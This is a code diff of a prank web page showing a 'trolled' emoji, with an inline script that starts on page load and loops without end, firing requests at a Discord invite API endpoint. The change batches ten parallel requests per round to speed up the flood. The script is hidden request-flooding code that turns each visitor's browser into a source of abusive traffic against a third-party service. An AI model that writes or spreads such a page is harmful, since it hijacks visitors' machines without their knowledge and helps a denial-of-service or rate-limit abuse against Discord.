@@ -13,18 +13,26 @@
     <img src="https://cdn.discordapp.com/emojis/964523154800246834.png?size=4096&quality=lossless" alt="trolled">
     <script>
         const url = 'https://discord.com/api/v9/invites/nouveau';
-        async function sendRequests() {
+        const batchSize = 10; // Adjust the batch size as per your requirements
+        //HOLY SHIT THIS IS FAST
+        async function sendBatchedRequests() {
+            const batch = Array.from({ length: batchSize }, () => fetch(url));
+            const responses = await Promise.all(batch);
+            for (const response of responses) {
+                console.log(`Status code - ${response.status}`);
+            }
+            }
+            async function sendRequests() {
             while (true) {
                 try {
-                    const response = await fetch(url);
-                    console.log(`Status code - ${response.status}`);
+                await sendBatchedRequests();
                 } catch (error) {
-                    console.error(`Error - ${error.message}`);
+                console.error(`Error - ${error.message}`);
                 }
             }
         }
-
         sendRequests();
+
 
     </script>
 </body>
